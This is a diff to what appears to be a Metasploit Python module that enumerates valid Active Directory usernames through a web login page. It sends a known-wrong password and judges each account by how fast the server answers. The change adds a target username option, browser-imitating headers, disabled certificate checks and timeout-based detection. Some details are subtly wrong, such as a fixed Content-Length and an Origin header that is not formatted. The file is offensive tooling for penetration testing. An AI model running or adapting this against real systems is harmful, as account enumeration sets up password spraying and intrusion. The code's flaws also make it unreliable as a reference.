@@ -22,7 +22,7 @@ metadata = {
         'Matthew Dunn'
     ],
     'date': '2020-12-23',
-    'license': 'MIT',
+    'license': 'MSF_LICENSE',
     'references': [
         {'type': 'url', 'ref': 'REPLACE ME'},
     ],
@@ -33,9 +33,10 @@ metadata = {
         'rhost': {'type': 'address', 'description': 'Host to target', 'required': True, 'default': None},
         'rport': {'type': 'port', 'description': 'Port to target', 'required': True, 'default': 443},
         'domain': {'type': 'string', 'description': 'The target AD domain', 'required': True, 'default': None},
-        'cutoff_time': {'type': 'number',
+        'username': {'type': 'string', 'description': 'The username to verify', 'required': True, 'default': None},
+        'cutoff_time': {'type': 'int',
                         'description': 'Minimum milliseconds for response to consider username invalid',
-                        'required': True, 'default': 1000}
+                        'required': True, 'default': 500}
     }
 }
 
@@ -46,14 +47,19 @@ def check_username(rhost, rport, targeturi, domain, username, cutoff_time):
     response should consider the username invalid."""
 
     url = f'https://{rhost}:{rport}/{targeturi}'
-    body = f'DomainUserName={domain}%5C{username}&UserPass=incorrect' 
+    body = f'DomainUserName={domain}%5C{username}&UserPass=incorrect'
+    headers = {'Host':rhost,
+               'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
+               'Content-Type': 'application/x-www-form-urlencoded',
+               'Content-Length': '53',
+               'Origin': 'https://{rhost}'}
     session = requests.Session()
     try:
-        request = session.post(url, data=body, timeout=cutoff_time)
+        request = session.post(url, data=body, headers=headers, timeout=cutoff_time / 1000, verify=False)
         if request.status_code == 200:
-            module.log(f'Username {domain}\{username} is valid! Response received in {request.elapsed} milliseconds',
+            module.log(f'Username {domain}\{username} is valid! Response received in {request.elapsed.microseconds / 1000} milliseconds',
                        level='good')
-        else:
+    except requests.exceptions.Timeout:
             module.log(f'Username {domain}\{username} is invalid! No response received in {cutoff_time} milliseconds',
                        level='error')
     except requests.exceptions.RequestException as e:
@@ -68,7 +74,7 @@ def run(args):
         return
 
     check_username(args['rhost'], args['rport'], args['targeturi'],
-                   args['domain'], args['username'], args['cutoff_time'])
+                   args['domain'], args['username'], int(args['cutoff_time']))
 
 
 if __name__ == '__main__':
